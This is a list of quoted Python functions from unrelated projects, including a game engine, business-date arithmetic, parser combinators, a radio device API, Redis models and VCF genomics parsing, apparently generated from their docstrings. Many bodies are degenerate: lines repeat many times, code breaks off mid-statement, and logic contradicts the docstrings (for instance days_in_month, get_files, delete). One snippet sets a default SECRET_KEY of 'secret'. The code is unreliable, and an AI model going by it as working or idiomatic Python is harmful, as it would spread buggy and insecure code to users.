        "def start(self):\n        \"\"\"Use when application is starting.\"\"\"\n        self.logger.info('Starting')\n        self.logger.debug('Application started')\n        self.logger.debug('Application started')\n        self.logger.debug('Application started')\n        self.logger.debug('Application started')\n        self.logger.debug('Application started')\n        self.logger.debug('Application started')\n        self.logger.debug('Application started')\n        self.logger.debug('Application started')\n        self.logger.debug('Application started')\n        self.logger.debug('Application started')\n        self.logger.debug('Application started')\n        self.logger.debug('Application started')\n        self.logger.debug('Application started')\n        self.logger.debug('Application started')\n        self.logger.debug('Application started')\n        self.logger.debug('Application",
        "def _async_connection(self, connection):\n        \"\"\"Catch a connection asyncrounosly.\"\"\"\n        try:\n            while True:\n                try:\n                    data = connection.recv(self.BUFFER_SIZE)\n                except socket.error:\n                    break\n                if data:\n                    self._send_data(data)\n                else:\n                    break",
        "def _init(self):\n        \"\"\"Initialize self.\"\"\"\n        self.data = {}\n        self.data_keys = []\n        self.data_values = []\n        self.data_types = []\n        self.data_types_keys = []\n        self.data_types_values = []\n        self.data_types_types = []\n        self.data_types_types_keys = []\n        self.data_types_types_values = []\n        self.data_types_types_types = []\n        self.data_types_types_types_keys = []\n        self.data_types_types_types_values = []\n        self.data_types_types_types_types = []\n        self.data_types_types_types_types_keys = []\n        self.data_types_types_types_types_values = []\n",
        "def _wait_for_connection(self, connection):\n        \"\"\"Asyncronously wait for a connection from the pool.\"\"\"\n        while True:\n            try:\n                return connection\n            except ConnectionClosedError:\n                if self._connection_pool.is_closed():\n                    raise\n                time.sleep(self._connection_pool.timeout)",
        "def release_waiters(self):\n        \"\"\"Release waiters.\"\"\"\n        if self.waiters:\n            for waiter in self.waiters:\n                waiter.release()\n            self.waiters = []",
        "def listen(self):\n        \"\"\"Listen for an id from the server.\n\n        At the beginning of a game, each client receives an IdFactory from the \n        server.  This factory are used to give id numbers that are guaranteed \n        to be unique to tokens that created locally.  This method checks to see if such \n        a factory has been received.  If it hasn't, this method does not block \n        and immediately returns False.  If it has, this method returns True \n        after saving the factory internally.  At this point it is safe to enter \n        the GameStage.\n        \"\"\"\n        while True:\n            try:\n                id_factory = self.server.recv(IdFactory)\n            except Exception as e:\n                self.logger.exception(\"Failed to receive IdFactory: %s\", e)\n                continue\n\n            if id_factory.id in self.id_fact",
        "def _handle_sync(self, msg):\n        \"\"\"Respond when the server indicates that the client is out of sync.\n\n        The server can request a sync when this client sends a message that \n        fails the check() on the server.  If the reason for the failure isn't \n        very serious, then the server can decide to send it as usual in the \n        interest of a smooth gameplay experience.  When this happens, the \n        server sends out an extra response providing the clients with the\n        information they need to resync themselves.\n        \"\"\"\n        if self.is_closed:\n            return\n        if self.is_syncing:\n            self.is_syncing = False\n            self.send_message(SyncResponse(msg))",
        "def handle_reject(self, message):\n        \"\"\"Manage the response when the server rejects a message.\n\n        An undo is when required this client sends a message that the server \n        refuses to pass on to the other clients playing the game.  When this \n        happens, the client must undo the changes that the message made to the \n        world before being sent or crash.  Note that unlike sync requests, undo \n        requests are only reported to the client that sent the offending \n        message.\n        \"\"\"\n        if message.type == MessageType.SYNC_REQUEST:\n            self.send_message(message.data)\n        elif message.type == MessageType.SYNC_RESPONSE:\n            self.send_message(message.data)\n        elif message.type == MessageType.SYNC_ERROR:\n            self.send_message(message.data)\n        else:\n            raise ValueError(\"Unexpected message",
        "def relay_messages(self, forum, client):\n        \"\"\"Relay messages from the forum on the server to the client represented \n        by this actor.\"\"\"\n        if not forum.is_forum:\n            return\n        if not client:\n            return\n        forum.relay_messages(client)",
        "def create(self, data_item):\n        \"\"\"Create a new DataItem.\"\"\"\n        data_item_id = self.create_data_item(data_item)\n        return self.get(data_item_id)",
        "def validate_token(token):\n    \"\"\"\n    Raise an ApiUsageError if the given object is not a token that is currently \n    participating in the game.  To be participating in the game, the given \n    token must have an id number and be associated with the world.\n    \"\"\"\n    if not isinstance(token, Token):\n        raise ApiUsageError(\"Token must be an instance of Token\")\n    if not token.id:\n        raise ApiUsageError(\"Token must have an id\")\n    if not token.world_id:\n        raise ApiUsageError(\"Token must have a world_id\")",
        "def _add_safety_checks(self):\n        \"\"\"Iterate through each member of the class being created and add a \n        safety check to every method that isn't marked as read-only.\n        \"\"\"\n        for name, member in self.__dict__.items():\n            if not hasattr(member, 'read_only'):\n                yield name, member",
        "def register_watch_callback(self, name, callback):\n        \"\"\"\n        Register the given callback to be called whenever the method with the \n        given name is called.  You can easily take advantage of this feature in \n        token extensions by using the @watch_token decorator.\n        \"\"\"\n        if name not in self._watch_callbacks:\n            self._watch_callbacks[name] = []\n        self._watch_callbacks[name].append(callback)",
        "def _clear_token_data(self, token):\n        \"\"\"\n        Clear all the internal data the token needed while it was part of \n        the world.\n\n        Note that this method doesn't actually remove the token from the \n        world.  That's what World._remove_token() does.  This method is just \n        responsible for setting the internal state of the token being removed.\n        \"\"\"\n        if token in self._tokens:\n            del self._tokens[token]\n            self._tokens_by_id[token.id] = None",
        "def lock(self):\n        \"\"\"\n        Allow tokens to modify the world for the duration of a with-block.\n\n        It's important that tokens only modify the world at appropriate times, \n        otherwise the changes they make may not be communicated across the \n        network to other clients.  To help catch and prevent these kinds of \n        errors, the game engine keeps the world locked most of the time and \n        only briefly unlocks it (using this method) when tokens are allowed to \n        make changes.  When the world is locked, token methods that aren't \n        marked as being read-only can't be called.  When the world is unlocked, \n        any token method can be called.  These checks can be disabled by \n        running python with optimization enabled.\n\n        You should never call this method manually from within your own game.  \n        This method is intended to be used by the game engine, which",
        "def xml_to_event_generator(xml_tree):\n    \"\"\"Converts XML tree to event generator\"\"\"\n    for event in xml_tree.findall('event'):\n        yield event\n        for child in event.findall('child'):\n            yield child",
        "def _build_xml(self, events):\n        \"\"\"Converts events stream into lXML tree\"\"\"\n        root = etree.Element('events')\n        for event in events:\n            event_element = etree.SubElement(root, 'event')\n            event_element.text = event.get('message')\n            event_element.attrib['id'] = event.get('id')\n            event_element.attrib['type'] = event.get('type')\n            event_element.attrib['timestamp'] = event.get('timestamp')\n            event_element.attrib['source'] = event.get('source')\n            event_element.attrib['source_id'] = event.get('source_id')\n            event_element.attrib['source_type'] = event.get('source_type')\n            event_element.attrib['source_id'] = event.get('source_id",
        "def parse_file(self, file_path):\n        \"\"\"Parses file content into events stream\"\"\"\n        with open(file_path, 'r') as f:\n            for line in f:\n                line = line.strip()\n                if line:\n                    self.parse_line(line)",
        "def select_sub_tree_events(self, event):\n        \"\"\" selects sub-tree events \"\"\"\n        if event.type() == QEvent.KeyPress:\n            if event.key() == Qt.Key_LeftArrow:\n                self.select_left_sub_tree_events(event)\n            elif event.key() == Qt.Key_RightArrow:\n                self.select_right_sub_tree_events(event)\n            elif event.key() == Qt.Key_UpArrow:\n                self.select_up_sub_tree_events(event)\n            elif event.key() == Qt.Key_DownArrow:\n                self.select_down_sub_tree_events(event)\n            elif event.key() == Qt.Key_PageUp:\n                self.select_up_page_sub_tree_events(event)\n            elif event.",
        "def _merge_text_events(self, text_events):\n        \"\"\"merges each run of successive text events into one text event\"\"\"\n        text_events = list(text_events)\n        for text_event in text_events:\n            if text_event.text_type == 'text':\n                text_event.text = text_event.text.replace('\\n', '')\n                text_event.text = text_event.text.replace('\\r', '')\n                text_event.text = text_event.text.replace('\\t', '')\n                text_event.text = text_event.text.replace('\\n', '')\n                text_event.text = text_event.text.replace('\\r', '')\n                text_event.text = text_event.text.replace('\\t', '')\n                text_event.text = text_",
        "def locate_enter_peers(xml_file):\n    \"\"\"\n    locates ENTER peer for each EXIT object. Convenient when selectively\n    filtering out XML markup\n    \"\"\"\n    ret = {}\n    for node in ET.parse(xml_file).getroot():\n        if node.tag == \"exit\":\n            ret[node.attrib[\"id\"]] = node.attrib[\"peer\"]\n    return ret",
        "def from_date(cls, datetime_date):\n        \"\"\"\n        construct BusinessDate instance from datetime.date instance,\n        raise ValueError exception if not possible\n\n        :param datetime.date datetime_date: calendar day\n        :return bool:\n        \"\"\"\n        if datetime_date.day < 1:\n            raise ValueError(\"date is not a valid day\")\n        if datetime_date.day > 31:\n            raise ValueError(\"date is not a valid day\")\n        return cls(datetime_date.year, datetime_date.month, datetime_date.day)",
        "def calendar_date(self):\n        \"\"\"construct datetime.date instance represented calendar date of BusinessDate instance\n\n        :return datetime.date:\n        \"\"\"\n        if self.calendar_date_is_empty:\n            return None\n        return datetime.date(self.year, self.month, self.day)",
        "def add_period(self, d, p, holiday_obj=None):\n        \"\"\"\n        addition of a period object\n\n        :param BusinessDate d:\n        :param p:\n        :type p: BusinessPeriod or str\n        :param list holiday_obj:\n        :return bankdate:\n        \"\"\"\n        if holiday_obj is None:\n            holiday_obj = []\n        if isinstance(p, BusinessPeriod):\n            p = p.to_dict()\n        if p.start_date is None:\n            p.start_date = d.date\n        if p.end_date is None:\n            p.end_date = d.date\n        if p.start_date < d.date:\n            raise ValueError(\"start date is before end date\")\n        if p.end_date > d.date:\n            raise ValueError(\"end date is after",
        "def add_months(self, d, month_int):\n        \"\"\"\n        addition of a number of months\n\n        :param BusinessDate d:\n        :param int month_int:\n        :return bankdate:\n        \"\"\"\n        return self.add_days(d, month_int, self.months)",
        "def _add_days_to_business_date(self, d, days_int, holiday_obj):\n        \"\"\"\n        private method for the addition of business days, used in the addition of a BusinessPeriod only\n\n        :param BusinessDate d:\n        :param int days_int:\n        :param list holiday_obj:\n        :return: BusinessDate\n        \"\"\"\n        if days_int > 0:\n            d.add_days(days_int)\n        return d",
        "def parse_until_closing_quote(parser=None):\n    \"\"\"Parses as much as possible until it encounters a matching closing quote.\n    \n    By default matches any_token, but can be provided with a more specific parser if required.\n    Returns a string\n    \"\"\"\n    if parser is None:\n        parser = any_token\n    return parser.parse_until(lambda t: t.type == TokenType.CLOSE_QUOTE)",
        "def days_in_month(year, month):\n    \"\"\"\n    returns number of days for the given year and month\n\n    :param int year: calendar year\n    :param int month: calendar month\n    :return int:\n    \"\"\"\n    return int(date(year, month, 1).day())",
        "def init_app(app):\n    \"\"\"Initialize the application.\"\"\"\n    app.config.setdefault('DEBUG', False)\n    app.config.setdefault('SECRET_KEY', 'secret')\n    app.config.setdefault('LOG_LEVEL', 'INFO')\n    app.config.setdefault('LOG_FILE', 'log.txt')\n    app.config.setdefault('LOG_FILE_LEVEL', 'INFO')\n    app.config.setdefault('LOG_FILE_FORMAT', '%(asctime)s %(levelname)s %(message)s')\n    app.config.setdefault('LOG_LEVEL_FORMAT', '%(levelname)s %(message)s')\n    app.config.setdefault('LOG_FILE_FORMAT_LEVEL', '%(levelname)s %(message)s')\n    app.config.setdefault('LOG_LEVEL_FORMAT_MESSAGE', '%(levelname)s %(message)",
        "def _register_middleware(self, connection):\n        \"\"\"Register connection's middleware and prepare self database.\"\"\"\n        self.middleware = connection.middleware\n        self.connection = connection\n        self.connection.prepare()",
        "def close(self):\n        \"\"\"Close all connections.\"\"\"\n        for conn in self.connections:\n            conn.close()\n        self.connections = []",
        "def register_model(self, model):\n        \"\"\"Register a model in self.\"\"\"\n        if model not in self.models:\n            self.models.append(model)\n            model.register(self)",
        "def _manage_connection(self, connection):\n        \"\"\"Manage a database connection.\"\"\"\n        if connection.is_closed:\n            raise ConnectionClosedError(\n                \"Connection to %s is closed\" % connection.url)\n        if connection.is_open:\n            raise ConnectionClosedError(\n                \"Connection to %s is already open\" % connection.url)\n        if connection.is_autocommit:\n            raise ConnectionClosedError(\n                \"Connection to %s is autocommit\" % connection.url)\n        if connection.is_transaction:\n            raise ConnectionClosedError(\n                \"Connection to %s is transaction\" % connection.url)\n        if connection.is_autocommit:\n            connection.is_transaction = True\n        if connection.is_read_only:\n            raise ConnectionClosedError(\n                \"Connection to %s is read-only\" % connection.url",
        "def migrate(model, sql, *fields, **kwargs):\n    \"\"\"Write your migrations here.\n\n    > Model = migrator.orm['name']\n\n    > migrator.sql(sql)\n    > migrator.create_table(Model)\n    > migrator.drop_table(Model, cascade=True)\n    > migrator.add_columns(Model, **fields)\n    > migrator.change_columns(Model, **fields)\n    > migrator.drop_columns(Model, *field_names, cascade=True)\n    > migrator.rename_column(Model, old_field_name, new_field_name)\n    > migrator.rename_table(Model, new_table_name)\n    > migrator.add_index(Model, *col_names, unique=False)\n    > migrator.drop_index(Model, index_name)\n    > migrator.add",
        "def run_parsers(parsers, **kwargs):\n    \"\"\"\n    Runs a series of parsers in sequence passing the result of each parser to the next.\n    The result of the last parser is returned.\n    \"\"\"\n    for parser in parsers:\n        result = parser(**kwargs)\n        if result is not None:\n            yield result",
        "def get_token(collection):\n    \"\"\"Returns the current token if is found in the collection provided.\n    \n    Fails otherwise.\n    \"\"\"\n    for token in collection:\n        if token.token == current_token:\n            return token\n    return None",
        "def get_current_token(collection, one_of=None):\n    \"\"\"Returns the current token if it is not found in the collection provided.\n    \n    The negative of one_of.\n    \"\"\"\n    if one_of is None:\n        one_of = []\n    for token in collection:\n        if token.one_of == one_of:\n            return token\n    return None",
        "def one_of(guard, *args, **kwargs):\n    \"\"\"Returns the current token if it satisfies the guard function provided.\n    \n    Fails otherwise.\n    This is the a generalisation of one_of.\n    \"\"\"\n    try:\n        return guard(*args, **kwargs)\n    except Exception as e:\n        raise TokenError(\"Failed to satisfy guard: %s\" % e)",
        "def _check_parser_input(self, parser):\n        \"\"\"Succeeds if the given parser cannot consume input\"\"\"\n        if not self.input_parser:\n            return\n        try:\n            self.input_parser.consume_input()\n        except EOFError:\n            pass",
        "def apply(self, *args):\n    \"\"\"Applies the parser to input zero or more times.\n    \n    Returns a list of parser results.\n    \"\"\"\n    results = []\n    for i in range(0, len(args), self.batch_size):\n      results.append(self.parser.apply(args[i:i+self.batch_size]))\n    return results",
        "def consume(self, term):\n    \"\"\"Consumes as many of these as it can until it term is encountered.\n    \n    Returns a tuple of the list of these results and the term result\n    \"\"\"\n    results = []\n    while True:\n      term = self.term(term)\n      if term is None:\n        break\n      results.append(term)\n    return results, term",
        "def consume_at_least(self, *args, **kwargs):\n        \"\"\"Like many_until but must consume at least one of these.\"\"\"\n        return self.many_until(lambda x: x, *args, **kwargs)",
        "def _sep_with_parser(parser, sep):\n    \"\"\"Like sep but must consume at least one of parser.\"\"\"\n    while True:\n        try:\n            return sep(parser)\n        except StopIteration:\n            pass",
        "def fill(self, source):\n        \"\"\"fills the internal buffer from the source iterator\"\"\"\n        while True:\n            item = source.next()\n            if item is None:\n                break\n            self.append(item)",
        "def next(self):\n        \"\"\"Advances to and returns the next token or returns EndOfFile\"\"\"\n        if self.pos >= self.length:\n            raise StopIteration\n        token = self.tokens[self.pos]\n        self.pos += 1\n        return token",
        "def cli(env, identifier, num_ais, host=None, port=None, verbose=None,\n        help=None):\n    \"\"\"Run a game being developed with the kxg game engine.\n\nUsage:\n    {exe_name} sandbox [<num_ais>] [-v...]\n    {exe_name} client [--host HOST] [--port PORT] [-v...]\n    {exe_name} server <num_guis> [<num_ais>] [--host HOST] [--port PORT] [-v...] \n    {exe_name} debug <num_guis> [<num_ais>] [--host HOST] [--port PORT] [-v...]\n    {exe_name} --help\n\nCommands:\n    sandbox\n        Play a sandbox game with the specified number of AIs.  None of",
        "def poll(self):\n        \"\"\"\n        Poll the queues that the worker can use to communicate with the \n        supervisor, until all the workers are done and all the queues are \n        empty.  Handle messages as they appear.\n        \"\"\"\n        while True:\n            try:\n                self.queue.get(block=True)\n            except queue.Empty:\n                self.log.debug(\"Worker %s has done all queues.\", self.id)\n                break",
        "def _get_field_type(self, field):\n        \"\"\"Return database field type.\"\"\"\n        if field.type == 'DateTimeField':\n            return 'datetime'\n        elif field.type == 'DateField':\n            return 'date'\n        elif field.type == 'TimeField':\n            return 'time'\n        elif field.type == 'IntegerField':\n            return 'integer'\n        elif field.type == 'FloatField':\n            return 'float'\n        elif field.type == 'BooleanField':\n            return 'boolean'\n        elif field.type == 'CharField':\n            return 'string'\n        elif field.type == 'BinaryField':\n            return 'binary'\n        elif field.type == 'DateTimeField':\n            return 'datetime'\n        elif field.type == 'DateField':\n            return 'date'\n        elif field.type ==",
        "def _parse_value(self, value):\n        \"\"\"Parse value from database.\"\"\"\n        if value is None:\n            return None\n        if isinstance(value, bool):\n            return value\n        if isinstance(value, int):\n            return int(value)\n        if isinstance(value, float):\n            return float(value)\n        if isinstance(value, str):\n            return value\n        if isinstance(value, datetime):\n            return value.date()\n        if isinstance(value, date):\n            return value\n        if isinstance(value, datetime.datetime):\n            return value.date()\n        if isinstance(value, datetime.date):\n            return value\n        if isinstance(value, datetime.time):\n            return value.time()\n        if isinstance(value, datetime.time):\n            return value\n        if isinstance(value, datetime.datetime):\n            return value.",
        "def _parse_fsapi_endpoint(self, url):\n        \"\"\"Parse the fsapi endpoint from the device url.\"\"\"\n        if not url:\n            return None\n        if url.startswith('fsapi://'):\n            return url[5:]\n        return None",
        "def create_session(self, session_id, **kwargs):\n        \"\"\"Create a session on the frontier silicon device.\"\"\"\n        return self.api_call(\n            ENDPOINTS['sessions']['new'],\n            dict(session_id=session_id),\n            body=kwargs\n        )",
        "def _execute_call(self, method, params, **kwargs):\n        \"\"\"Execute a frontier silicon API call.\"\"\"\n        if method == 'GET':\n            return self._get(params, **kwargs)\n        elif method == 'POST':\n            return self._post(params, **kwargs)\n        elif method == 'PUT':\n            return self._put(params, **kwargs)\n        elif method == 'DELETE':\n            return self._delete(params, **kwargs)",
        "def _set_fsapi_value(self, key, value, fsapi_path):\n        \"\"\"Helper method for setting a value by using the fsapi API.\"\"\"\n        if not value:\n            return\n        if not isinstance(value, dict):\n            raise ValueError(\"Value must be a dict\")\n        if not fsapi_path:\n            raise ValueError(\"FSAPI path must be set\")\n        try:\n            self._fsapi.set(fsapi_path, value)\n        except Exception as e:\n            raise ValueError(\"Failed to set %s: %s\" % (key, e))",
        "def _fetch_text(self, key, default=None):\n        \"\"\"Helper method for fetching a text value.\"\"\"\n        try:\n            return self._data[key]\n        except KeyError:\n            return default",
        "def _fetch_int(self, key, default=None):\n        \"\"\"Helper method for fetching a integer value.\"\"\"\n        try:\n            return int(self.get(key))\n        except (ValueError, TypeError):\n            return default",
        "def _fetch_long(self, key, default=None):\n        \"\"\"Helper method for fetching a long value. Result is integer.\"\"\"\n        try:\n            return int(self.get(key))\n        except (TypeError, ValueError):\n            return default",
        "def is_on(self):\n        \"\"\"Check if the device is on.\"\"\"\n        if self._is_on is None:\n            self._is_on = self._is_on_from_device()\n        return self._is_on",
        "def power_on(self, power_on=True):\n        \"\"\"Power on or off the device.\"\"\"\n        if power_on:\n            self._send_command(CMD_POWER_ON)\n        else:\n            self._send_command(CMD_POWER_OFF)",
        "def modes(self):\n        \"\"\"Get the modes supported by this device.\"\"\"\n        if self._modes is None:\n            self._modes = self._get_modes()\n        return self._modes",
        "def read_max_volume(self):\n        \"\"\"Read the maximum volume level of the device.\"\"\"\n        cmd = self.command_builder('read', 'max_volume')\n        return self.read_command(cmd).get('max_volume')",
        "def is_muted(self):\n        \"\"\"Check if the device is muted.\"\"\"\n        if self._is_muted is None:\n            self._is_muted = self._is_muted_from_device()\n        return self._is_muted",
        "def mute(self, mute):\n        \"\"\"Mute or unmute the device.\"\"\"\n        if mute:\n            self._mute = True\n        else:\n            self._mute = False",
        "def get_play_status(self):\n        \"\"\"Get the play status of the device.\"\"\"\n        if self._play_status is None:\n            self._play_status = self._get_play_status()\n        return self._play_status",
        "def get_equaliser_modes(self):\n        \"\"\"Get the equaliser modes supported by this device.\"\"\"\n        return [\n            mode\n            for mode in self._get_supported_modes()\n            if mode.startswith(self.EQUALISER_MODE_PREFIX)\n        ]",
        "def set_sleep_timer(self, seconds):\n        \"\"\"Set device sleep timer.\"\"\"\n        self._set_attribute(ATTR_SLEEP_TIMER, seconds)\n        self._set_attribute(ATTR_SLEEP_TIMER_MAX, seconds)",
        "def _ensure_buffer_coords(self, start, stop, value, value_len):\n        \"\"\"\n        Assumes that start and stop are already in 'buffer' coordinates. value is a byte iterable.\n        value_len is fractional.\n        \"\"\"\n        if value_len < 0:\n            raise ValueError(\"value_len must be non-negative\")\n        if value_len > self.buffer_size:\n            raise ValueError(\"value_len must be less than buffer size\")\n        if value_len < self.buffer_size:\n            start = int(start)\n            stop = int(stop)\n            value = value[start:stop]\n        return value",
        "def _parse_genotype(line):\n    \"\"\"Parse genotype from VCF line data\n    \"\"\"\n    genotype = line.split()[1].split(\"=\")[0].strip()\n    if genotype == \"NA\":\n        genotype = \"NA\"\n    return genotype",
        "def toIndex(self, toStorage=None):\n\t\t'''\n\t\t\ttoIndex - An optional method which will return the value prepped for index.\n\n\t\t\tBy default, \"toStorage\" will be called. If you provide \"hashIndex=True\" on the constructor,\n\t\t\tthe field will be md5summed for indexing purposes. This is useful for large strings, etc.\n\t\t'''\n\t\tif not toStorage:\n\t\t\ttoStorage = self.toStorage\n\t\tif self.hashIndex:\n\t\t\treturn hashlib.md5(toStorage(self.value)).hexdigest()\n\t\treturn toStorage(self.value)",
        "def copy(self):\n\t\t'''\n\t\t\tcopy - Create a copy of this IRField.\n\n\t\t\t  Each subclass should implement this, as you'll need to pass in the args to constructor.\n\n\t\t\t@return <IRField (or subclass)> - Another IRField that has all the same values as this one.\n\t\t'''\n\t\treturn IRField(self.name, self.type, self.default, self.description, self.default_value, self.default_value_type, self.default_value_format, self.default_value_format_type, self.default_value_format_type, self.default_value_format_type, self.default_value_format_type, self.default_value_format_type, self.default_value_format_type, self.default_value_format_type, self.default_value_",
        "def objHasUnsavedChanges(self, obj):\n        '''\n            objHasUnsavedChanges - Check if any object has unsaved changes, cascading.\n        '''\n        if self.objHasUnsavedChangesInternal(obj):\n            return True\n        if self.objHasUnsavedChanges(obj):\n            return True\n        if self.objHasUnsavedChanges(obj.parent):\n            return True\n        return False",
        "def assert_json_type(value, type_):\n    \"\"\"Check that a value has a certain JSON type.\n\n    Raise TypeError if the type does not match.\n\n    Supported types: str, int, float, bool, list, dict, and None.\n    float will match any number, int will only match numbers without\n    fractional part.\n\n    The special type JList(x) will match a list value where each\n    item is of type x:\n\n    >>> assert_json_type([1, 2, 3], JList(int))\n    \"\"\"\n    if not isinstance(value, type_):\n        raise TypeError(\n            \"Expected %s, got %s\" % (type_.__name__, type(value).__name__)\n        )",
        "def load(self, fh):\n        \"\"\"Load json or yaml data from file handle.\n\n        Args:\n            fh (file): File handle to load from.\n\n        Examlple:\n            >>> with open('data.json', 'r') as json:\n            >>>    jsdata = composite.load(json)\n            >>>\n            >>> with open('data.yml', 'r') as yml:\n            >>>    ymldata = composite.load(yml)\n        \"\"\"\n        with fh:\n            return self.load_json(fh)",
        "def load(self, fh):\n        \"\"\"Load json from file handle.\n\n        Args:\n            fh (file): File handle to load from.\n\n        Examlple:\n            >>> with open('data.json', 'r') as json:\n            >>>    data = composite.load(json)\n        \"\"\"\n        with fh:\n            return json.load(fh)",
        "def intersection(self, other, recursive=False):\n        \"\"\"\n        Recursively compute intersection of data. For dictionaries, items\n        for specific keys will be reduced to unique items. For lists, items\n        will be reduced to unique items. This method is meant to be analogous\n        to set.intersection for composite objects.\n\n        Args:\n            other (composite): Other composite object to intersect with.\n            recursive (bool): Whether or not to perform the operation recursively,\n                for all nested composite objects.\n        \"\"\"\n        if recursive:\n            return set(self.items).intersection(other.items)\n        return set(self.items).intersection(other)",
        "def union(self, other, recursive=False, overwrite=False):\n        \"\"\"\n        Recursively compute union of data. For dictionaries, items\n        for specific keys will be combined into a list, depending on the\n        status of the overwrite= parameter. For lists, items will be appended\n        and reduced to unique items. This method is meant to be analogous\n        to set.union for composite objects.\n\n        Args:\n            other (composite): Other composite object to union with.\n            recursive (bool): Whether or not to perform the operation recursively,\n                for all nested composite objects.\n            overwrite (bool): Whether or not to overwrite entries with the same\n                key in a nested dictionary.\n        \"\"\"\n        if recursive:\n            for key, value in other.items():\n                if overwrite or key in self:\n                    self[key] = value\n                else:\n                    self.union(value",
        "def append(self, obj):\n        \"\"\"Append to object, if object is list.\"\"\"\n        if isinstance(obj, list):\n            self.data.append(obj)\n        else:\n            self.data.append(obj)",
        "def extend_list(obj, list_):\n    \"\"\"Extend list from object, if object is list.\"\"\"\n    if isinstance(obj, list):\n        for item in obj:\n            extend_list(item, list_)\n    return obj",
        "def write_json(self, fh, pretty=True):\n        \"\"\"Write composite object to file handle in JSON format.\n\n        Args:\n            fh (file): File handle to write to.\n            pretty (bool): Sort keys and indent in output.\n        \"\"\"\n        if pretty:\n            json.dump(self.to_dict(), fh, indent=4)\n        else:\n            json.dump(self.to_dict(), fh)",
        "def get_files(self):\n        \"\"\"Return list of files in filetree.\"\"\"\n        files = []\n        for root, dirs, files in os.walk(self.root):\n            for filename in files:\n                if filename.endswith('.py'):\n                    files.remove(filename)\n        return files",
        "def prune(self, regex):\n        \"\"\"Prune leaves of filetree according to specified\n        regular expression.\n\n        Args:\n            regex (str): Regular expression to use in pruning tree.\n        \"\"\"\n        for node in self.tree.traverse():\n            if re.search(regex, node.name):\n                self.remove(node)",
        "def resolve(self, ctx):\n        \"\"\"\n        Returns the value this reference is pointing to. This method uses 'ctx' to resolve the reference and return\n        the value this reference references.\n        If the call was already made, it returns a cached result.\n        It also makes sure there's no cyclic reference, and if so raises CyclicReferenceError.\n        \"\"\"\n        if self._resolved is None:\n            self._resolved = self._resolve(ctx)\n        return self._resolved",
        "def delete(self):\n\t\t'''\n\t\t\tdelete - Delete all objects in this list.\n\n\t\t\t@return <int> - Number of objects deleted\n\t\t'''\n\t\tif self.count() == 0:\n\t\t\treturn 0\n\t\tself.setCount(self.count() - 1)\n\t\treturn self.count()",
        "def save(self, *args, **kwargs):\n        '''\n            save - Save all objects in this list\n        '''\n        for obj in self:\n            obj.save(*args, **kwargs)",
        "def reload(self):\n\t\t'''\n\t\t\treload - Reload all objects in this list. \n\t\t\t\tUpdates in-place. To just fetch all these objects again, use \"refetch\"\n\n\t\t\t@return - List (same order as current objects) of either exception (KeyError) if operation failed,\n\t\t\t  or a dict of fields changed -> (old, new)\n\t\t'''\n\t\tchanges = {}\n\t\tfor obj in self:\n\t\t\tchanges[obj.get_key()] = obj.reload()\n\t\treturn changes",
        "def fetch(self):\n\t\t'''\n\t\t\trefetch - Fetch a fresh copy of all items in this list.\n\t\t\t\tReturns a new list. To update in-place, use \"reload\".\n\n\t\t\t@return IRQueryableList<IndexedRedisModel> - List of fetched items\n\t\t'''\n\t\tself.reload()\n\t\treturn self.__class__.from_redis(self.redis, self.key)",
        "def render_str(self, value, **kwargs):\n        \"\"\"Renders as a str\"\"\"\n        return self.render(value, **kwargs).encode('utf-8')",
        "def _get_start_tag(self, tag):\n        \"\"\"Returns the elements HTML start tag\"\"\"\n        if tag == 'div':\n            return '<div'\n        elif tag == 'table':\n            return '<table'\n        elif tag == 'tr':\n            return '<tr'\n        elif tag == 'td':\n            return '<td'\n        elif tag == 'th':\n            return '<th'\n        elif tag == 'div':\n            return '<div'\n        else:\n            raise ValueError('Unknown tag: %s' % tag)",
        "def safe_repr(obj):\n    \"\"\"\n    Returns a repr of an object and falls back to a minimal representation of type and ID if the call to repr raised\n    an error.\n\n    :param obj: object to safe repr\n    :returns: repr string or '(type<id> repr error)' string\n    :rtype: str\n    \"\"\"\n    try:\n        return repr(obj)\n    except Exception as e:\n        return '(type<{}> repr error)'.format(type(obj).__name__)",
        "def match_genome_vcf(genome_vcf, clinvar_vcf_file, zygosity='Het'):\n    \"\"\"Match a genome VCF to variants in the ClinVar VCF file\n\n    Acts as a generator, yielding tuples of:\n    (ClinVarVCFLine, ClinVarAllele, zygosity)\n\n    'zygosity' is a string and corresponds to the genome's zygosity for that\n    ClinVarAllele. It can be either: 'Het' (heterozygous), 'Hom' (homozygous),\n    or 'Hem' (hemizygous, e.g. X chromosome in XY individuals).\n    \"\"\"\n    with open(clinvar_vcf_file) as in_handle:\n        with open(genome_vcf, 'r') as in_handle:\n            for line",
        "def as_dict(self):\n        \"\"\"Return Allele data as dict object.\"\"\"\n        return {\n            'id': self.id,\n            'name': self.name,\n            'description': self.description,\n            'date_of_birth': self.date_of_birth,\n            'gender': self.gender,\n            'birth_date': self.birth_date,\n            'birth_time': self.birth_time,\n            'gender_id': self.gender_id,\n            'gender_name': self.gender_name,\n            'gender_type': self.gender_type,\n            'gender_type_id': self.gender_type_id,\n            'gender_type_name': self.gender_type_name,\n            'gender_type_id_name': self.gender_type_id_name,\n            '",
        "def _create_alleles(self, line):\n        \"\"\"Create list of Alleles from VCF line data\"\"\"\n        alleles = []\n        for allele in line:\n            allele = allele.split(\"=\")\n            allele = allele[0].strip()\n            allele = allele.replace(\".\", \"\")\n            allele = allele.replace(\"-\", \"\")\n            allele = allele.replace(\" \", \"\")\n            allele = allele.replace(\".\", \"\")\n            allele = allele.replace(\"-\", \"\")\n            allele = allele.replace(\".\", \"\")\n            allele = allele.replace(\"-\", \"\")\n            allele = allele.replace(\".\", \"\")\n            allele = allele.replace(\".\", \"\")\n            allele = allele.replace(\".\", \"\")\n            allele = allele.replace(\".\", \"\")\n            allele = allele.replace(\".\", \"\"",
        "def _parse_vcf_info(self, info):\n        \"\"\"Parse the VCF info field\"\"\"\n        if info is None:\n            return None\n        info = info.split(\"\\t\")\n        if len(info) != 3:\n            raise ValueError(\"Invalid VCF info: %s\" % info)\n        return info",
        "def vcf_data(self):\n        \"\"\"Dict representation of parsed VCF data\"\"\"\n        if self._vcf_data is None:\n            self._vcf_data = self._parse_vcf()\n        return self._vcf_data",
        "def _get_pos(self, line):\n        \"\"\"Very lightweight parsing of a vcf line to get position.\n\n        Returns a dict containing:\n        'chrom': index of chromosome (int), indicates sort order\n        'pos': position on chromosome (int)\n        \"\"\"\n        chrom, pos = line.split()\n        return {'chrom': int(chrom), 'pos': int(pos)}",
